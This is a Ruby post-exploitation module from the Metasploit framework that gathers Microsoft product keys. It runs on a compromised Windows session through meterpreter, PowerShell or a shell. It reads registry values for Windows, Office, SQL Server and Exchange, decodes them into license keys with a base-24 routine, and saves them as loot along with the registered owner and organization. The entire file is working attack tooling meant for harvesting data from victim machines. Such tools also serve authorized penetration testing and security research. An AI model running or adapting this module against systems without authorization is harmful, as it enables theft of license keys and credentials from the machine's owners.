##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Product Key',
        'Description' => %q{ This module will enumerate Microsoft product license keys. },
        'License' => MSF_LICENSE,
        'Author' => [ 'Brandon Perry <bperry.volatile[at]gmail.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => %w[meterpreter powershell shell],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def app_list
    tbl = Rex::Text::Table.new(
      'Header' => 'Keys',
      'Indent' => 1,
      'Columns' =>
        [
          'Product',
          'Registered Owner',
          'Registered Organization',
          'License Key'
        ]
    )

    keys = [
      [ 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'DigitalProductId4' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Office\\11.0\\Registration\\{91110409-6000-11D3-8CFE-0150048383C9}', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-00CA-0000-0000-0000000FF1CE}', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0014-0000-0000-0000000FF1CE}', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0051-0000-0000-0000000FF1CE}', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-0053-0000-0000-0000000FF1CE}', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\100\\Tools\\Setup', 'DigitalProductId' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\90\\ProductID', 'DigitalProductId77654' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\90\\ProductID', 'DigitalProductId77574' ],
      [ 'HKLM\\SOFTWARE\\Microsoft\\Exchange\\Setup', 'DigitalProductId' ],
    ]

    wow64 = !sysinfo.nil? && sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86

    keys.each do |keyx86|
      # parent key
      p = keyx86[0, 1].join

      # child key
      c = keyx86[1, 1].join

      if wow64
        keychunk = registry_getvaldata(p, c, REGISTRY_VIEW_64_BIT)
        appname = registry_getvaldata(p, 'ProductName', REGISTRY_VIEW_64_BIT)
        rowner = registry_getvaldata(p, 'RegisteredOwner', REGISTRY_VIEW_64_BIT)
        rorg = registry_getvaldata(p, 'RegisteredOrganization', REGISTRY_VIEW_64_BIT)
      else
        keychunk = registry_getvaldata(p, c)
        appname = registry_getvaldata(p, 'ProductName')
        rowner = registry_getvaldata(p, 'RegisteredOwner')
        rorg = registry_getvaldata(p, 'RegisteredOrganization')
      end

      next if keychunk.nil?

      key = decode(keychunk.unpack('C*'))

      next if key.nil?

      tbl << [
        appname.nil? ? p : appname,
        rowner.to_s,
        rorg.to_s,
        key
      ]
    end

    if tbl.rows.empty?
      print_status('Found no Microsoft product keys')
      return
    end

    results = tbl.to_csv
    print_line("\n#{tbl}\n")
    path = store_loot('host.ms_keys', 'text/plain', session, results, 'ms_keys.txt', 'Microsoft Product Key and Info')
    print_good("Product keys stored in: #{path}")
  end

  def decode(chunk)
    start = 52

    # charmap idex
    alphas = %w[B C D F G H J K M P Q R T V W X Y 2 3 4 6 7 8 9]

    decode_length = 29
    string_length = 15

    # product ID in coded bytes
    product_id = Array.new

    # finished and finalized decoded key
    key = ''

    # From byte 52 to byte 67, inclusive
    52.upto(67) do |i|
      product_id[i - start] = chunk[i]
    end

    # From 14 down to 0, decode each byte in the
    # currently coded product_id
    (decode_length - 1).downto(0) do |i|
      if ((i + 1) % 6) == 0
        key << '-'
      else
        mindex = 0 # char map index

        (string_length - 1).downto(0) do |s|
          t = ((mindex << 8) & 0xffffffff) | product_id[s]
          product_id[s] = t / 24
          mindex = t % 24
        end

        key << alphas[mindex]
      end
    end

    key.reverse
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Finding Microsoft product keys on #{hostname} (#{session.session_host})")
    app_list
  end
end
